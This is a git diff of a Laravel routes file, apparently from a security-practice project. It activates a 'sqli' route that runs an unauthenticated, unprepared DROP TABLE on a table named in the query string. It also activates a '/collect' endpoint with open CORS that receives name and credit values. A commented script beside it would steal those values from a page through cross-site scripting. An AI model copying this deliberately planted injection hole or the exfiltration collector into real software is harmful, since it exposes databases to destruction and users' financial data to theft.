@@ -24,22 +24,22 @@ Route::get('auth/facebook', [UsersController::class, 'redirectToFacebook'])->nam
 Route::get('auth/facebook/callback', [UsersController::class, 'handleFacebookCallback']);
 
 
-// Route::get('sqli',function(Request $request){
-//     $table =$request->query('table');
-//     DB::unprepared("DROP TABLE $table");
-//     return redirect('/')->with('success', 'Table deleted successfully');
-// });
+Route::get('sqli',function(Request $request){
+    $table =$request->query('table');
+    DB::unprepared("DROP TABLE $table");
+    return redirect('/')->with('success', 'Table deleted successfully');
+});
 
 
-// Route::get('/collect',function(Request $request){
-//     $name = $request->query('name');
+Route::get('/collect',function(Request $request){
+    $name = $request->query('name');
 
-//     $credit = $request->query('credit');
-//     return response ('Data collected, 200')
-//     ->header('Access-Control-Allow-Origin', '*')
-//     ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
-//     ->header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
-// });
+    $credit = $request->query('credit');
+    return response ('Data collected, 200')
+    ->header('Access-Control-Allow-Origin', '*')
+    ->header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE')
+    ->header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
+});
 
 // <script>
 // let name = document.getElementById('name').textContent;
@@ -49,7 +49,6 @@ Route::get('auth/facebook/callback', [UsersController::class, 'handleFacebookCal
 // xhr.open('GET', `http://127.0.0.1:8000/collect?name=${encodeURIComponent(name)}&credit=${encodeURIComponent(credit)}`);
 // xhr.send();
 // </script>
-
 
 Route::middleware(['auth'])->group(function () {
 
@@ -75,8 +74,10 @@ Route::middleware(['auth'])->group(function () {
     Route::get('/products/insufficient-credit', function () {
         return view('products.insufficient_credit');
     })->name('insufficient_credit');
+    Route::get('/return-product/{userId}/{productId}', [ProductsController::class, 'returnProduct'])->name('return_product');
 
 });
+
 Route::get('/', function () {
     return view('welcome');
 });
